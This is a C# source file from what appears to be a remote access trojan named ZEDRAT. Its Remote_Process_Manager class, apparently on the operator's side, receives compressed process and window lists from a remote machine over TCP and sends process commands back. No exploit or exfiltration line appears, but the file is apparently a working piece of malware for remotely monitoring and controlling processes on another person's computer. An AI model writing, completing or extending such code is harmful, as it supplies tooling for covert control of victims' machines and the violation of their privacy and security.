using System;
using System.Collections.Generic;
using System.Text;
using Remote_Process;
using Sockets;
using ZEDRAT.Algorithm;
using ZEDRAT.Messages;
using ZEDRAT.TCP;

namespace ZEDRAT.Module
{
	public class Remote_Process_Manager
	{
		public Action<string, object> _FormExecute;

		public List<RemoteProcessList> Processlist = new List<RemoteProcessList>();

		public List<byte> Processbyte = new List<byte>();

		public TcpClientSession _tcs;

		public Remote_Process_Manager(TcpClientSession tcs)
		{
			this._tcs = tcs;
		}

		public void RemoteProcessExecute(TcpClientSession tcs, byte[] bt)
		{
			try
			{
				RemoteProcess_Messages remoteProcess_Messages = RemoteProcess_Messages.ByteToClass(bt);
				string shellDataType = remoteProcess_Messages._ShellDataType;
				if (shellDataType != "Begin")
				{
					if (shellDataType != "WindowRefresh")
					{
						if (shellDataType != "End")
						{
							if (shellDataType != "SetupEnd")
							{
								if (!(shellDataType != "Status"))
								{
									this._FormExecute("Status", Encoding.UTF8.GetString(remoteProcess_Messages._Payload));
								}
							}
							else
							{
								this.CheckingProcesslist(remoteProcess_Messages._Payload, "SetupRefresh");
							}
						}
						else
						{
							this.CheckingProcesslist(remoteProcess_Messages._Payload, "Refresh");
						}
					}
					else
					{
						this._FormExecute("WindowRefresh", Serializable.Deserialize(GZip.Decompress(remoteProcess_Messages._Payload)) as RemoteProcessList);
					}
				}
				else
				{
					this.Processbyte.AddRange(remoteProcess_Messages._Payload);
				}
			}
			catch (Exception ex)
			{
				this.Processbyte?.Clear();
				this.Processlist?.Clear();
				this._FormExecute("Status", ex.Message);
			}
		}

		private void CheckingProcesslist(byte[] payload, string Refresh)
		{
			try
			{
				if (this.Processbyte.Count != BitConverter.ToInt32(payload, 0))
				{
					this._FormExecute("Status", "Failed to get the remote process list.");
					return;
				}
				this.Processlist = Serializable.Deserialize(GZip.Decompress(this.Processbyte.ToArray())) as List<RemoteProcessList>;
				this._FormExecute(Refresh, this.Processlist);
			}
			catch (Exception ex)
			{
				throw ex;
			}
			finally
			{
				this.Processbyte?.Clear();
				this.Processlist?.Clear();
			}
		}

		public void Remote_Process_Send(string command, byte[] payload)
		{
			try
			{
				this._tcs.Client_Send(DataType.RemoteProcessType, RemoteProcess_Messages.ClassToByte(new RemoteProcess_Messages(command, payload)));
			}
			catch (Exception ex)
			{
				this._FormExecute("Status", ex.Message);
			}
		}

		public void destroy()
		{
			this._FormExecute = null;
			this._tcs = null;
			this.Processlist?.Clear();
			this.Processlist = null;
			this.Processbyte?.Clear();
			this.Processbyte = null;
		}
	}
}
